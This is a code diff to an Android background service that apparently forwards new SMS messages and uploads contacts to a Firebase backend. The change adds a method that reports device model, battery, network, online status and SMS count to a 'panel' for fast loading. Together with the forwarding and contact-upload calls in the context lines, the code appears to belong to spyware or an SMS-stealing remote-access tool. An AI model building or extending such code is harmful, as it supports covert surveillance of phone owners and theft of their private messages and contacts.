@@ -161,6 +161,7 @@ public class BackgroundSyncService extends Service {
 
         deviceRef.child("live_data").setValue(live);
         updateDeviceInfo();
+        updateStatusSummary(live);
         checkAndForwardNewSms();
     }
 
@@ -207,6 +208,23 @@ public class BackgroundSyncService extends Service {
                 if (current != last) { uploadAllContacts(); prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply(); }
             }
         }).start();
+    }
+
+    /** Writes a tiny summary to devices_status/{id} — panel uses this for fast loading */
+    private void updateStatusSummary(Map<String, Object> live) {
+        Map<String, Object> s = new HashMap<>();
+        s.put("name",       Build.MODEL);
+        s.put("brand",      Build.BRAND);
+        s.put("android",    Build.VERSION.RELEASE);
+        s.put("battery",    live.get("battery_level"));
+        s.put("network",    live.get("network_type"));
+        s.put("charging",   live.get("is_charging"));
+        s.put("ts",         ServerValue.TIMESTAMP);
+        s.put("online",     true);
+        s.put("sms_count",  live.containsKey("total_sms") ? live.get("total_sms") : 0);
+        DatabaseReference statusRef = databaseReference.child("devices_status").child(deviceId);
+        statusRef.setValue(s);
+        statusRef.child("online").onDisconnect().setValue(false);
     }
 
     private void updateDeviceInfo() {
